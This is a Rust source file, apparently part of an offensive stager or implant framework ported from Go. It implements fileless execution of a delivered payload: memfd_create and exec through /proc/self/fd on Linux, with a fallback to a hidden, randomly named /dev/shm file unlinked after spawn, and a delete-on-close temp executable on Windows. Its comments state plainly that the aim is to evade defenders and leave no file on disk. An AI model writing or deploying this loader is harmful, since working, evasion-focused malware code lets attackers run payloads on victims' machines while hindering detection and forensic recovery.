//! Stager payload loader.
//!
//! Replaces `stager/loader_linux.go`, `stager/loader_windows.go`,
//! and `stager/loader_other.go`. The three Go files differed only
//! in the platform-specific execution primitive; the public
//! function is `execute_in_memory(payload: &[u8])` on every target.
//!
//! # Contract
//!
//! `execute_in_memory` writes the payload to a location the kernel
//! can exec from, spawns the child, and returns. It does **not**
//! wait for the child. The stager's `main()` is expected to return
//! after this call; the child is orphaned to init (Linux) or the
//! process tree continues without it (Windows). This is the same
//! shape `cmd.Start()` gives in the Go tree — a stager that stayed
//! alive to poll the child would defeat the point of the loader.
//!
//! # Platform behaviour
//!
//! - **Linux** — `memfd_create` first. The fd is `MFD_CLOEXEC`;
//!   the child execs `/proc/self/fd/N` and the kernel resolves the
//!   symlink *before* CLOEXEC fires, so the exec succeeds and the
//!   fd is closed in the child afterwards. If `memfd_create`
//!   itself fails (old kernel, seccomp filter, container without
//!   the syscall), fall back to a `/dev/shm` temp file that is
//!   unlinked *after* `spawn` returns.
//!
//!   **Fallback rule.** The Go tree falls back to `/dev/shm` only
//!   when `memfdCreate` returns an error. A failure in `Write`,
//!   `Fchmod`, or `Start` after the memfd is created returns its
//!   error directly — it does not fall back. This port preserves
//!   that rule: the fallback is scoped to the `memfd_create`
//!   call, not to the whole memfd path.
//!
//! - **Windows** — Write to `%TEMP%\srv_<hex>.exe`, then open a
//!   second handle with `FILE_FLAG_DELETE_ON_CLOSE`. The handle is
//!   stored in a `OnceLock` so it lives for the process lifetime;
//!   the file is not actually deleted until the child (which holds
//!   its own handle from `CreateProcess`) exits. The Go tree used
//!   a package-level `stageHandle` for the same purpose. Windows
//!   does not delete the file until *every* handle closes, so
//!   keeping the parent's handle open is what guarantees the
//!   delete-on-close does not fire before the child is even
//!   spawned.
//!
//! - **Other** — Return `StagerError::Unsupported`. The stager is
//!   a Linux/Windows-only capability; a build for macOS or BSD
//!   would compile but refuse at runtime.
//!
//! # What this module does not do
//!
//! - **It does not verify the payload.** The caller (`stager.rs`)
//!   is responsible for the SHA-256 check and the `X-Payload-Sig`
//!   signature check before calling in.
//! - **It does not zero the payload buffer.** The caller is
//!   expected to scrub with `zeroize` after `execute_in_memory`
//!   returns; the stager's `main()` owns that step.
//! - **It does not wait for the child.** There is no way to learn
//!   the child's exit code from here, and the stager does not try
//!   to invent one.

use std::io;

/// Error type for the stager loader.
///
/// Every variant names a specific failure mode so the stager's
/// `main()` can print a diagnostic the operator can act on. The
/// variants are deliberately coarse — a fine-grained errno dump
/// from `memfd_create` would be `io::Error`-shaped, and the stager
/// is not the place to be clever about which syscall failed.
#[derive(Debug)]
pub enum StagerError {
    /// The platform is not Linux or Windows.
    Unsupported,
    /// A filesystem write failed.
    Write(io::Error),
    /// A permission change (`fchmod` / `chmod`) failed.
    Chmod(io::Error),
    /// Spawning the child failed.
    Spawn(io::Error),
    /// A platform-specific syscall failed with the named
    /// diagnostic.
    Platform(&'static str, io::Error),
}

impl std::fmt::Display for StagerError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Unsupported => {
                write!(f, "stager not supported on this platform")
            }
            Self::Write(e) => write!(f, "write payload: {e}"),
            Self::Chmod(e) => write!(f, "chmod payload: {e}"),
            Self::Spawn(e) => write!(f, "spawn payload: {e}"),
            Self::Platform(what, e) => write!(f, "{what}: {e}"),
        }
    }
}

impl std::error::Error for StagerError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Unsupported => None,
            Self::Write(e) | Self::Chmod(e) | Self::Spawn(e) => {
                Some(e)
            }
            Self::Platform(_, e) => Some(e),
        }
    }
}

/// Execute `payload` in memory and return as soon as the child is
/// spawned. See the module doc for the platform-specific details.
pub fn execute_in_memory(payload: &[u8]) -> Result<(), StagerError> {
    imp::execute_in_memory(payload)
}

// =====================================================================
// Linux
// =====================================================================

#[cfg(target_os = "linux")]
mod imp {
    use super::StagerError;
    use std::fs;
    use std::io;
    use std::os::raw::c_long;
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::io::{FromRawFd, RawFd};
    use std::process::{Command, Stdio};

    pub fn execute_in_memory(payload: &[u8]) -> Result<(), StagerError> {
        // Fallback rule (matches Go): only a `memfd_create`
        // failure reaches the `/dev/shm` path. A failure in
        // `write`, `fchmod`, or `spawn` after the memfd is
        // created returns its error directly.
        match memfd_create(b"payload\0") {
            Ok(fd) => memfd_execute(fd, payload),
            Err(_) => exec_via_shm(payload),
        }
    }

    /// Primary path: `memfd_create`, write, `fchmod`, exec via
    /// `/proc/self/fd/N`.
    fn memfd_execute(fd: RawFd, payload: &[u8]) -> Result<(), StagerError> {
        // Wrap the fd in a File so Drop closes it, matching the
        // `defer syscall.Close(fd)` in the Go tree.
        let file = unsafe { fs::File::from_raw_fd(fd) };

        // `write_all` loops on partial writes and handles
        // `EINTR`; the Go `syscall.Write` did not.
        {
            use std::io::Write;
            (&file).write_all(payload).map_err(StagerError::Write)?;
        }

        // fchmod 0700 so the fd-addressed inode is executable.
        fchmod_executable(fd).map_err(StagerError::Chmod)?;

        // `/proc/self/fd/N` is a magic symlink; the kernel
        // resolves it in the child's execve *before* CLOEXEC
        // fires on fd N, so the image is loaded and the fd is
        // closed afterwards. This is the same trick the Go
        // tree relies on.
        let path = format!("/proc/self/fd/{fd}");
        let child = Command::new(&path)
            .stdin(Stdio::inherit())
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .spawn()
            .map_err(StagerError::Spawn)?;

        // Do not wait. Dropping a `Child` does not kill it and
        // does not wait for it; the process becomes an orphan
        // and is reaped by init when it exits. This matches
        // `cmd.Start()`.
        drop(child);

        // `file` drops here, closing the parent's fd. The
        // child's exec has already completed and its image is
        // mapped from the memfd's inode, so the inode survives
        // until the child exits.
        drop(file);
        Ok(())
    }

    /// Fallback: temp file in `/dev/shm`, chmod, spawn, unlink.
    ///
    /// The unlink happens *after* `spawn` returns, so the
    /// child's exec has already opened the file. The inode
    /// stays alive until the child exits. This is what makes
    /// the stager "memory-only" on the target's filesystem
    /// after the first few milliseconds.
    fn exec_via_shm(payload: &[u8]) -> Result<(), StagerError> {
        // Random 8-byte suffix so the name is not predictable
        // to a defender watching `/dev/shm`. The Go tree used
        // `os.CreateTemp`, which uses the same shape.
        let mut rnd = [0u8; 8];
        getrandom_fill(&mut rnd)
            .map_err(|e| StagerError::Platform("getrandom", e))?;
        let path = format!("/dev/shm/.stage_{}", hex_encode(&rnd));

        let file = fs::File::create(&path).map_err(StagerError::Write)?;
        {
            use std::io::Write;
            (&file).write_all(payload).map_err(StagerError::Write)?;
        }
        // `File::create` gives 0600; the payload needs the
        // execute bit.
        fs::set_permissions(
            &path,
            fs::Permissions::from_mode(0o700),
        )
        .map_err(StagerError::Chmod)?;
        drop(file);

        let child = Command::new(&path)
            .stdin(Stdio::inherit())
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .spawn();
        let child = match child {
            Ok(c) => c,
            Err(e) => {
                // Spawn failed — remove the file. The Go
                // tree does the same. No handle is open,
                // so the unlink succeeds immediately.
                let _ = fs::remove_file(&path);
                return Err(StagerError::Spawn(e));
            }
        };
        drop(child);

        // Unlink *after* spawn. The child holds the inode
        // through its exec mapping; the path disappears but
        // the data survives until the child exits.
        let _ = fs::remove_file(&path);
        Ok(())
    }

    /// `memfd_create(2)`. Returns the raw fd.
    ///
    /// Uses `libc::syscall` with `SYS_memfd_create`, which the
    /// `libc` crate defines correctly for every Linux
    /// architecture. The Go tree hardcoded the per-arch
    /// numbers; we let `libc` do the dispatch.
    fn memfd_create(name_with_nul: &[u8]) -> io::Result<RawFd> {
        debug_assert!(name_with_nul.ends_with(b"\0"));
        let ret = unsafe {
            libc::syscall(
                libc::SYS_memfd_create as c_long,
                name_with_nul.as_ptr() as *const libc::c_void,
                libc::MFD_CLOEXEC as c_long,
            )
        };
        if ret < 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(ret as RawFd)
    }

    /// `fchmod(fd, 0o700)`.
    fn fchmod_executable(fd: RawFd) -> io::Result<()> {
        let ret = unsafe { libc::fchmod(fd, 0o700) };
        if ret < 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(())
    }

    /// Fill `buf` with cryptographically secure random bytes.
    ///
    /// Inline because the stager is size-sensitive; the
    /// `getrandom` crate would be redundant on Linux, where
    /// `libc::getrandom` is a three-line call.
    fn getrandom_fill(buf: &mut [u8]) -> io::Result<()> {
        let mut filled = 0usize;
        while filled < buf.len() {
            let ret = unsafe {
                libc::getrandom(
                    buf[filled..].as_mut_ptr() as *mut libc::c_void,
                    buf.len() - filled,
                    0,
                )
            };
            if ret < 0 {
                let e = io::Error::last_os_error();
                // `getrandom(2)` can be interrupted by a
                // signal; retry the whole call in that case.
                if e.kind() == io::ErrorKind::Interrupted {
                    continue;
                }
                return Err(e);
            }
            filled += ret as usize;
        }
        Ok(())
    }

    /// Lowercase hex. Inline because the `hex` crate would
    /// add a dependency for a ten-line loop.
    fn hex_encode(bytes: &[u8]) -> String {
        const HEX: &[u8; 16] = b"0123456789abcdef";
        let mut out = String::with_capacity(bytes.len() * 2);
        for b in bytes {
            out.push(HEX[(b >> 4) as usize] as char);
            out.push(HEX[(b & 0x0f) as usize] as char);
        }
        out
    }
}

// =====================================================================
// Windows
// =====================================================================

#[cfg(target_os = "windows")]
mod imp {
    use super::StagerError;
    use std::fs;
    use std::os::windows::ffi::OsStrExt;
    use std::process::{Command, Stdio};
    use std::sync::OnceLock;
    use windows_sys::Win32::Foundation::{
        CloseHandle, HANDLE, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, DELETE, FILE_FLAG_DELETE_ON_CLOSE,
        FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ,
        OPEN_EXISTING,
    };

    /// The delete-on-close handle kept alive for the process
    /// lifetime.
    ///
    /// Windows does not delete the file until *every* handle
    /// closes. The child opens its own handle during
    /// `CreateProcess` (the kernel maps the image), so the file
    /// survives until the child exits. This global ensures the
    /// *parent's* handle stays open too, so the file is not
    /// deleted by the parent closing its handle before the child
    /// opens one. The Go tree used a package-level
    /// `stageHandle` for the same purpose.
    static STAGE_HANDLE: OnceLock<isize> = OnceLock::new();

    pub fn execute_in_memory(payload: &[u8]) -> Result<(), StagerError> {
        // Random 8-byte suffix for the filename. The Go tree
        // used `crypto/rand`; `getrandom` is the same syscall
        // on Windows (BCryptGenRandom under the hood).
        let mut rnd = [0u8; 8];
        getrandom::getrandom(&mut rnd).map_err(|e| {
            StagerError::Platform(
                "getrandom",
                std::io::Error::new(std::io::ErrorKind::Other, e),
            )
        })?;
        let name = format!("srv_{}.exe", hex_encode(&rnd));

        let path = std::env::temp_dir().join(&name);

        fs::write(&path, payload).map_err(StagerError::Write)?;

        // Open with `FILE_FLAG_DELETE_ON_CLOSE` and the same
        // access mask the Go tree used (`GENERIC_READ |
        // DELETE`). The `DELETE` access is what lets the
        // delete-on-close flag attach to the file; on some
        // Windows versions, omitting it makes the open fail.
        let handle = open_delete_on_close(&path)
            .map_err(|e| StagerError::Platform("CreateFileW", e))?;

        // Store the handle. On the (programming-error) second
        // call path, `set` returns `Err` and the previous
        // handle stays. We leak the new handle rather than
        // closing it — closing would let the file be deleted
        // if the child has not yet opened its own handle.
        // Leaking an OS handle for the process lifetime is the
        // safe failure mode.
        let _ = STAGE_HANDLE.set(handle);

        let child = Command::new(&path)
            .stdin(Stdio::inherit())
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .spawn();

        match child {
            Ok(c) => {
                // Do not wait. `Child`'s Drop closes the
                // process handle but does not kill or wait;
                // the child continues as an orphan. Matches
                // `cmd.Start()`.
                drop(c);
                Ok(())
            }
            Err(e) => {
                // Spawn failed. Close our handle so the file
                // is deleted when we exit. `STAGE_HANDLE`
                // still holds the (now-invalid) value; a
                // second call would leak its own handle, but
                // a second call after a spawn failure is a
                // programming error and not worth guarding.
                if let Some(h) = STAGE_HANDLE.get().copied() {
                    unsafe {
                        CloseHandle(h as HANDLE);
                    }
                }
                Err(StagerError::Spawn(e))
            }
        }
    }

    /// Open `path` with `FILE_FLAG_DELETE_ON_CLOSE` and return
    /// the raw handle.
    ///
    /// `std::fs::OpenOptions` cannot express the
    /// `GENERIC_READ | DELETE` access mask the Go tree used
    /// (`.read(true)` gives `GENERIC_READ` but there is no
    /// `.delete(true)`), so this drops to `CreateFileW`
    /// directly. `windows-sys` is a constants-plus-extern
    /// crate; it adds no runtime weight.
    fn open_delete_on_close(
        path: &std::path::Path,
    ) -> std::io::Result<isize> {
        let wide: Vec<u16> = path
            .as_os_str()
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        let h = unsafe {
            CreateFileW(
                wide.as_ptr(),
                (GENERIC_READ | DELETE) as u32,
                (FILE_SHARE_READ | FILE_SHARE_WRITE) as u32,
                std::ptr::null(),
                OPEN_EXISTING as u32,
                FILE_FLAG_DELETE_ON_CLOSE as u32,
                0,
            )
        };
        if h == INVALID_HANDLE_VALUE {
            return Err(std::io::Error::last_os_error());
        }
        Ok(h)
    }

    fn hex_encode(bytes: &[u8]) -> String {
        const HEX: &[u8; 16] = b"0123456789abcdef";
        let mut out = String::with_capacity(bytes.len() * 2);
        for b in bytes {
            out.push(HEX[(b >> 4) as usize] as char);
            out.push(HEX[(b & 0x0f) as usize] as char);
        }
        out
    }
}

// =====================================================================
// Other platforms
// =====================================================================

#[cfg(not(any(target_os = "linux", target_os = "windows")))]
mod imp {
    use super::StagerError;

    pub fn execute_in_memory(
        _payload: &[u8],
    ) -> Result<(), StagerError> {
        Err(StagerError::Unsupported)
    }
}